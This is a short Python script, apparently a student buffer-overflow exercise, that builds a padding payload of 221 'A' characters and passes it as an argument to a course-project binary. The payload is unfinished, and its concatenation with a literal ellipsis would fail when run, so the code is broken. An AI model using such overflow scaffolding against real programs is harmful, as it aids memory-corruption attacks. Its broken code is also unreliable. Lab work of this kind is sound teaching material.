#!/usr/bin/env python
# encoding: utf-8
import subprocess


def main():

    # payload
    payload = "A"*221 + "" + ...

    # args
    argv = ['/home/ubuntu/proj1/bin/proj1_dep_Reed.Brian', payload]

    subprocess.call(argv)

if __name__ == "__main__":
    main()
